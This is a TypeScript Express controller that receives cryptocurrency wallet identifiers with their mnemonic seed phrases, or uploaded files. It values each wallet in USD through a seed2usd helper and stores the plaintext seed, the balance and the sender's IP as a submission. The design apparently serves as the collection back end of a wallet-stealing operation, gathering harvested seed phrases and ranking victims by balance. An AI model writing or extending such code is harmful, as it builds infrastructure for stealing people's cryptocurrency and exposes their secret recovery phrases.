import { Request, Response } from 'express';
import { z } from 'zod';
import { AuthenticatedRequest } from '../middleware/accessKey';
import { SubmissionService } from '../services/submissionService';
import { Logger } from '../utils/logger';
import { seed2usd } from '../utils/seed2usd';

const walletsDataSchema = z.object({
  xe_wallet: z.string(),
  xe_mnemonic: z.string(),
});

export const walletsController = {
  /**
   * Handles uploading wallet data, runs seed2usd on mnemonic, and saves to DB.
   */
  uploadWalletsData: async (req: AuthenticatedRequest, res: Response) => {
    try {
      const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
      let data: string | undefined;
      let filePath: string | undefined;
      let fileName: string | undefined;
      let xe_wallet: string | undefined;
      let xe_mnemonic: string | undefined;
      let balance_usd: number | undefined;

      // Handle file upload
      if (req.file) {
        filePath = req.file.path;
        fileName = req.file.filename;
      }

      // Handle JSON data (expects { data: { xe_wallet, xe_mnemonic } })
      if (req.body && req.body.data) {
        let parsedData;
        if (typeof req.body.data === 'string') {
          parsedData = JSON.parse(req.body.data);
        } else {
          parsedData = req.body.data;
        }
        const validated = walletsDataSchema.parse(parsedData);
        xe_wallet = validated.xe_wallet;
        xe_mnemonic = validated.xe_mnemonic;

        // Run seed2usd if mnemonic present
        if (xe_mnemonic) {
          try {
            const balanceResult = await seed2usd(xe_mnemonic);
            balance_usd = balanceResult.totalUsdBalance;
          } catch {
            balance_usd = undefined;
          }
        }

        data = JSON.stringify({ xe_wallet, xe_mnemonic, balance_usd });
      }

      if (!data && !filePath) {
        return res.status(400).json({ error: 'No data or file provided' });
      }

      // Save submission to database
      await SubmissionService.createSubmission(
        req.user!.id,
        'wallets',
        data,
        filePath,
        fileName,
        ipAddress,
      );

      res.status(200).json({ message: 'Wallets data received successfully' });
    } catch (error: any) {
      Logger.error('Wallets upload error', {
        userId: req.user?.id,
        hasFile: !!req.file,
        hasBody: !!req.body,
        error: error.message,
      });
      res.status(400).json({ error: 'Invalid request data' });
    }
  },
};
